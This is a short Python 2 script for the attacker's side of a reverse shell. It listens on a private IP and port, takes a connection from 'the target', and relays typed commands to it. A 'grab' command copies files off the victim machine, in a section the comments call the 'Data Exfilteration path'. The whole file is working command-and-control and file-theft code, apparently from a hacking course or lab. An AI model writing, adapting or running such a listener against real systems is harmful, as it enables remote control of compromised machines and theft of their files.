import socket #For creating the TCP Connection
import os

def transfer(con,command):
	con.send(command)
	filename=command.split('\\')[len(command.split('\\'))-1]
	path='/root/Desktop/' + filename
	f=open(path, 'wb')
	while True:
		bits = con.recv(1024)
		if 'file not found' in bits:
			print 'File Not Found'
		if 'END' in bits:
			print 'Transfer complete'
			f.close()
			break
		f.write(bits) 
		
	

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	s.bind(("192.168.57.129", 8090))
	s.listen(1) 				# listen for single connection from the target. Backlog size  = 1
	con, addr = s.accept() 			# accept function returns connection object and target address: port
	print 'Connection received from IP Address : ', addr
	
	while True:
	
		command = raw_input("Shell> ")
		
		#close the connection if the input is 'close'
		if 'close' in command:
			con.send('close')
			con.close()
			break

		#Data Exfilteration path
		elif 'grab' in command: 
			transfer(con, command) # Actual transfer of data
			
		else: 
			con.send(command)
			print con.recv(1024)

def main ():
	connect()
	
main()
